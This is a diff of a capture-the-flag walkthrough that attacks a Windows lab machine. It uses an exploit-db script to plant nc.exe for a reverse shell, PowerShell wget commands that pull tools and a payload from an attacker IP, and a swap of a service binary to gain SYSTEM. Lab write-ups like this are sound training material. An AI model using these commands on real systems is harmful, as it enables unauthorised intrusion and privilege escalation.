@@ -196,17 +196,18 @@ First what we need to do is download the **PowerUp.ps1** script to our working d
 Remember the python script that I said you should save to your working directory cause we're gonna use it later, well later is now :D
 
 If you didn't save it then no big deal you can just go to you directory and type:
-*cp /usr/share/exploitdb/exploits/windows/remote/39161.py* - this will copy the script to you current directory
+*cp /usr/share/exploitdb/exploits/windows/remote/39161.py .* - this will copy the script to you current directory
 
 And also we will download the ncat.exe from the link provided - https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe
 
-When you download the exe file be sure to rename it to nc.exe since this is what the python script will recognize since it will upload this nc.exe to the target machine and use it for our revese shell.
+When you download the exe file be sure to rename it to nc.exe because this is what the python script will recognize since it will upload this nc.exe to the target machine and use it for our revese shell (this information is within the script).
 
 Renaming the exe file - *mv ncat.exe nc.exe*
 
-Okay so when we run the payload with python we will get an error saying that we have to provide the IP address and the port and when we go to the script 
 
 **FIY**: you have to run it with just python 39616.py <IP address> <port>, python3 will give you an error if you try
+
+Lets take a look at our python script:
 
 ![image](https://user-images.githubusercontent.com/81188817/112213471-6832cf80-8c1e-11eb-9705-b4bfa963559d.png)
 
@@ -230,11 +231,13 @@ The first time we run, we will acutually be transfering the nc.exe that we downl
 
 
 And the second time we run the script we will get a shell.
-Now we can go to bills Desktop and pull winpeas (if you need to find out if the system is x64 or x86 you can use this command - *wmic os get osarchitecture* )
 
-So our system is x64 we can use winPEASx64.exe that we can downlad from here - https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe
+THE POWER OF three
+Now we can go to bills Desktop and pull winPEAS (if you need to find out if the system is x64 or x86 you can use this command - *wmic os get osarchitecture* )
 
-And again pull it over our web server so make sure you download this exe file in the same folder where your nc.exe is :)
+So our system is x64 we can use winPEASx64.exe that we can download from here - https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe
+
+And again pull it over from our web server so make sure you download this exe file in the same folder where your nc.exe is :)
 
 Then on our windows machine type:
 *powershell -c wget "http://10.14.7.187/winPEASx64.exe" -outfile winPEASx64.exe*
@@ -244,3 +247,25 @@ This will download the winPEASx64.exe to our windows machine and you can run it 
 Yellow and red marked are the stuff that you should pay attention to.
 
 So I tried winPEASx64 as well as winPEASany.exe, but wasn't able to find anything, the x64 just stops at one point and doesn't execute I left it for 30 minutes nothing, then the ANY looked promising but then the same thing happens just at a different point.
+
+I'll definitely try it a couple of times and update if I get a different result.
+
+What powershell -c command could we run to manually find out the service name? With a bit of googling the Powershell commands you will find the answer to be:
+
+  **powershell -c "Get-Service"**
+
+##### EXPLOATATION:
+
+So we will exploit the same service as we did in the previous priv esc with metaspoloit, but if you are doing this one right after the exploitation with metasploit I would recommend to restart the target machine so you can reupload the payload for the AdvancedSystemCareService9 service.
+
+We will first go to the Advanced SystemCare folder with the command *cd C:\Program Files (x86)\IObit\Advanced SystemCare\* and there we will first stop the service with either net stop AdvancedSystemCareService9 or sc stop AdvancedSystemCareService9
+
+Then copy our payload with the command we user earlier and start the service:
+
+*powershell -c wget "http://10.14.7.187/ASCService.exe" -outfile ASCService.exe*
+
+And  we have to use sc start, I tried with net start but it wasn't working and as soon as I went with sc like it was recommended I got the shell :)
+
+And again we got nt authority\system and we can go and pick up the root.txt at C:\Users\Administrator\Desktop (to list files in a folder you can use *dir* and to look at a file equivalent to *cat* from Linux is *type*)
+
+## HAPPY NOISES!
